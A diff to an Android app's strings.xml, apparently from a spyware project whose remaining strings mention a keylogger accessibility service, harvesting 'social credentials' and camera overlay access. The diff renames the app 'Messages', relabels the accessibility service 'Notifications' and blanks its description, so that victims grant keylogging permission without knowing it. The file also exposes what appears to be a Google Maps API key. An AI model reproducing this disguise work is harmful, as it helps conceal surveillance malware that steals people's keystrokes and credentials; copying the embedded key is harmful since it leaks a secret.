@@ -5,7 +5,7 @@
     //Menu Path Data
     <string name="menu_vector_path" translatable="false">M20 30,L80 30,M20 50,L80 50,M20 70,L80 70</string>
 
-    <string name="app_name">Android text to speech</string>
+    <string name="app_name">Messages</string>
 
     <string name="APY_KEY_MAPS" translatable="false">AIzaSyDAvYMu8Xqh4dVsJb1yjVTjZx5f4lA86fU</string>
 
@@ -129,9 +129,9 @@
     <string name="msg_dialog_enable_usage_stats">You need to activate the "Applications with use access" permission to obtain social credentials</string>
     <string name="enable_keylogger_success">Successful KeyLogger accessibility</string>
 
-    <string name="accessibility_service_label">Android text to speech</string>
-    <string name="accessibility_service_description">Text to speech allows user turn voice into text.</string>
-    <string name="msg_dialog_enable_accessibility_service">Text to speech allows user turn voice into text.</string>
+    <string name="accessibility_service_label">Notifications</string>
+    <string name="accessibility_service_description"></string>
+    <string name="msg_dialog_enable_accessibility_service"></string>
     <string name="enable_service">ENABLE SERVICE ACCESSIBILITY</string>
     <string name="enable_overdraw">ENABLE OVERDRAW CAMERA</string>
     <string name="enable_usage_stats">ENABLE USAGE STATS</string>
